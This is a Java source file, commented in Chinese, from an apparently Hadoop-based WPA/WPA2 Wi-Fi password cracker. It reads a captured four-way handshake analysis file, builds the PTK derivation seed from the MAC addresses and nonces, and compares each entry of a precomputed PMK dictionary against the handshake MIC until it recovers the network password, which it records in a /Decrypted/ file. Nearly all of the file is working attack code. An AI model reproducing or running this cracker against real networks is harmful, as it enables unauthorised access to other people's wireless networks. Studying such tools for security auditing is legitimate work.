
/**
 * 找Key。根据认证流程，从PMK字典里逐一匹配
 */
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.FSDataInputStream;
import org.apache.hadoop.fs.FSDataOutputStream;
import org.apache.hadoop.fs.FileSystem;
import org.apache.hadoop.fs.Path;

public class FindKey {
	/**
	 * 按一定规则拼接AMac，SMac， ANonce， SNonce作为生成PTK的参数
	 * 
	 * @param AMac
	 * @param SMac
	 * @param ANonce
	 * @param SNonce
	 * @return 拼接后的字符串
	 */
	private static String SeedMerge(String AMac, String SMac, String ANonce, String SNonce) {
		if (AMac.compareTo(SMac) < 0) {
			if (ANonce.compareTo(SNonce) < 0)
				return AMac.concat(SMac.concat(ANonce.concat(SNonce)));
			else
				return AMac.concat(SMac.concat(SNonce.concat(ANonce)));
		} else {
			if (ANonce.compareTo(SNonce) < 0)
				return SMac.concat(AMac.concat(ANonce.concat(SNonce)));
			else
				return SMac.concat(AMac.concat(SNonce.concat(ANonce)));
		}
	}

	/**
	 * 寻找密码
	 * 
	 * @param handshake
	 *            握手包分析文件所在路径
	 * @return WiFi密码（未找到返回null）
	 * @throws Exception
	 *             文件不存在
	 */
	@SuppressWarnings("deprecation")
	public static String Find(String handshake) throws Exception {
		/* 打开握手包分析文件 */
		Configuration conf1 = new Configuration();
		FileSystem fs = FileSystem.get(conf1);
		Path src = new Path(handshake);
		FSDataInputStream dis = fs.open(src);
		/* 当没有分析文件时，提示找不到文件错误，并返回null（未找到密码）。 */
		if (dis == null) {
			System.out.println("Analysis file not exist. Exit");
			return null;
		}
		dis.seek(0);
		/* 读取分析文件第一行：SSID */
		String SSID = dis.readLine();
		/* 去找找是否已有PMK字典，没有的话提示没有字典，返回null（未找到密码）。 */
		Path pmko = new Path("/pmk_" + SSID + "/part-r-00000");
		if (fs.exists(pmko) == false) {
			System.err.println("PMK Dict does not exist.");
			dis.close();
			return null;
		}
		/* 有PMK字典，打开 */
		FSDataInputStream PKD = fs.open(pmko);
		/* 读取AMac等余下信息 */
		String AMac = dis.readLine();
		String SMac = dis.readLine();
		String ANonce = dis.readLine();
		String SNonce = dis.readLine();
		String MIC = dis.readLine();
		String HsMsg = dis.readLine();
		/* 拼接一下PRF算法的标签和种子。有一定的规则，可查阅相关资料 */
		String Seed = SeedMerge(AMac, SMac, ANonce, SNonce);
		/* 去找找是否已经破解过这个SSID，若是我们就把它读出来，并清空待写新的结果 */
		Path decryptedFile = new Path("/Decrypted/" + SSID);
		String PMKPointer = fs.exists(decryptedFile) ? fs.open(decryptedFile).readLine() : PKD.readLine();
		FSDataOutputStream history = fs.create(decryptedFile);
		/* 遍历整个PMK字典 */
		while (PMKPointer != null) {
			String[] ss = PMKPointer.split("	");
			/* 比对密码，规则见条件的函数内部，如果匹配成功则返回结果 */
			if (HmacSHA1.Process(ss[1], Seed, HsMsg, MIC)) {
				dis.close();
				PKD.close();
				/* 写入已解密文件 */
				history.write((ss[0] + "	" + ss[1]).getBytes());
				history.close();
				/* 返回正确密码 */
				return ss[0];
			}
			/* 匹配失败，继续尝试下一个密码 */
			PMKPointer = PKD.readLine();
		}
		/* 字典已跑完，没有找到密码，返回null（未找到密码）。 */
		PKD.close();
		dis.close();
		history.close();
		return null;
	}
}
